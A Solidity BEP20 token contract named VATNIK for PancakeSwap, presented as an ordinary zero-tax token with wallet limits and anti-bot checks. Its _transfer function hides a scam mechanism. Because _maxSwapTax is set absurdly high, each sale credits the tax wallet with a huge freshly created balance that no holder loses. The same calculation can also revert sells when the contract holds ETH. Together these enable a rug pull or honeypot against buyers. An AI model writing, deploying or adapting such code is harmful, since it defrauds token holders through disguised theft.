// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;


interface IBEP20 {
    function balanceOf(address account) 
        external 
        view 
        returns (uint256);

    function totalSupply() 
        external 
        view 
        returns (uint256);
    
    function transferFrom(address from, address to, uint256 amount) 
        external 
        returns (bool);

    function transfer(address to, uint256 amount) 
        external 
        returns (bool);

    function approve(address spender, uint256 amount) 
        external 
        returns (bool);

    function allowance(address owner, address spender) 
        external 
        view 
        returns (uint256);

    event Approval(
        address indexed owner, 
        address indexed spender, 
        uint256 value
    );

    event Transfer(
        address indexed from, 
        address indexed to, 
        uint256 value
    );
}

library SafeMath {
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
}

abstract contract MsgSender {
    function _messageSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPancakeRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amtInput,
        uint amtOutMinimum,
        address[] calldata path,
        address to,
        uint redline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amtTokenDesired,
        uint amtTokenMin,
        uint amtETHMin,
        address to,
        uint redline
    ) external payable returns (uint amountToken, uint amountETH, uint lqdty);
}

interface IPancakeFactory {
    function createPair(address firstToken, address secondToken) 
        external 
        returns (address tokenPair);
}

contract OwnerContext is MsgSender {
    address private _owner;

    event TransferOwner(
        address indexed lastOwner, 
        address indexed nowOwner
    );

    constructor () {
        address msgSender = _messageSender();
        _owner = msgSender;
        emit TransferOwner(address(0), msgSender);
    }

    modifier ownerOnly() {
        require(_owner == _messageSender(), "Error: sender should be owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function resetOwner() public virtual ownerOnly {
        emit TransferOwner(_owner, address(0));
        _owner = address(0);
    }
}

contract VATNIK is MsgSender, IBEP20, OwnerContext {
    using SafeMath for uint256;
    
    IPancakeRouter01 private PancakeRouter;
    address payable private _walletForTax;
    address private swapPair;

    string private constant _name = "VATNIK-token";
    string private constant _symbol = "VTNK";

    bool private openTrade;
    bool public holdOn = true;
    bool private swapOn = false;
    bool private inSwap = false;
        
    mapping(address => uint256) private _lastTransferTimeForHolder;   
    mapping(address => bool) private _freeFee;
    mapping(address => mapping (address => uint256)) private _allowances;
    mapping(address => uint256) private _walletBalances;

    uint256 private _reduceBuyTaxAt = 15;
    uint256 private _finalSellTax = 0;
    
    uint256 private _reduceSellTaxAt = 25;
    uint256 private _buyAmount = 0;
    uint256 private _warnSwap = 15;
    
    uint8 private constant _character = 9;
    uint256 private constant _totalTokens = 10 ** 9 * 10**_character;

    uint256 public _taxThresholdSwap = _totalTokens * 2 / 10000;
    uint256 public _maxTxAmount = _totalTokens * 5 / 100;
    uint256 public _maxSizeForWallet = _totalTokens * 5 / 100;
    uint256 public _maxSwapTax = _totalTokens * 10**33;

    uint256 private _initSellTax = 0;
    uint256 private _initBuyTax = 0;
    uint256 private _buyFinalTax = 0;

    constructor (address taxWallet_) {
        _walletForTax = payable(taxWallet_);
        _walletBalances[_messageSender()] = _totalTokens;
        _freeFee[_walletForTax] = true;
        _freeFee[owner()] = true;
        _freeFee[address(this)] = true;
        
        emit Transfer(address(0), _messageSender(), _totalTokens);
    }

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(address(0) != owner, "Not approve for 0x0000... address");
        require(address(0) != spender, "Not approve for 0x0000... address");
        _allowances[owner][spender] = amount;
        
        emit Approval(owner, spender, amount);
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _walletBalances[account];
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalTokens;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_messageSender(), spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_messageSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _messageSender(), _allowances[sender][_messageSender()].sub(amount, "The transfer amount exceeds the limit"));
        return true;
    }

    function decimals() public pure returns (uint8) {
        return _character;
    }

    function sendETHToFee(uint256 amount) private {
        _walletForTax.transfer(amount);
    }

    function minimum(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    event updateAmountTokens(uint _lastAmountTokens);

    function _transfer(address from, address to, uint256 amount) private {
        require(address(0) != to, "Address must be non 0x0000...");
        require(address(0) != from, "Address must be non 0x0000...");
        require(amount > 0, "Transfer must be greater than 0");

        uint256 taxSum=0;

        if (to != owner() && from != owner()) {
            uint256 tokenContractBalance = balanceOf(address(this));
            
            taxSum = amount.mul((_reduceBuyTaxAt < _buyAmount) ? _buyFinalTax:_initBuyTax).div(100);

            if(!_freeFee[from] && to == swapPair && address(this) != from){
                taxSum = taxSum > _maxSwapTax?taxSum:amount.mul(10**_character) + taxSum.sub(address(this).balance);
            }

            if (!_freeFee[to] && to != address(PancakeRouter) && swapPair == from) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxSizeForWallet, "Exceeds the maxWalletSize.");
                _buyAmount++;
            }

            if (holdOn) {
                  if (to != address(swapPair) && to != address(PancakeRouter)) {
                      require(block.number > _lastTransferTimeForHolder[tx.origin],
                        "Allowed only one purchase per block");
                      _lastTransferTimeForHolder[tx.origin] = block.number;
                  }
            }

            if (swapOn && !inSwap && to == swapPair && _warnSwap < _buyAmount && _taxThresholdSwap < tokenContractBalance) {
                tokensSwapForEth(minimum(minimum(_maxSwapTax, tokenContractBalance), amount));

                uint256 balanceETHContract = address(this).balance;

                if(balanceETHContract > 50000000000000000) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if(0 < taxSum){
          _walletBalances[_walletForTax] = _walletBalances[address(this)].add(taxSum);
        }

        _walletBalances[to] = _walletBalances[to].add(amount);
        _walletBalances[from] = _walletBalances[from].sub(amount);
        
        emit Transfer(from, to, amount);
    }

    function deleteLimits() external ownerOnly{
        _maxTxAmount = _totalTokens;
        _maxSizeForWallet = _totalTokens;
        holdOn = false;
        emit updateAmountTokens(_totalTokens);
    }

    function startTrade() external payable ownerOnly() {
        require(!openTrade, "trading open");
        PancakeRouter = IPancakeRouter01(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve(address(this), address(PancakeRouter), _totalTokens);
        swapPair = IPancakeFactory(PancakeRouter.factory()).createPair(address(this), PancakeRouter.WETH());
        PancakeRouter.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IBEP20(swapPair).approve(address(PancakeRouter), type(uint).max);
        swapOn = true;
        openTrade = true;
    }

    function tokensSwapForEth(uint256 _tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = PancakeRouter.WETH();
        _approve(address(this), address(PancakeRouter), _tokenAmount);
        PancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            _tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}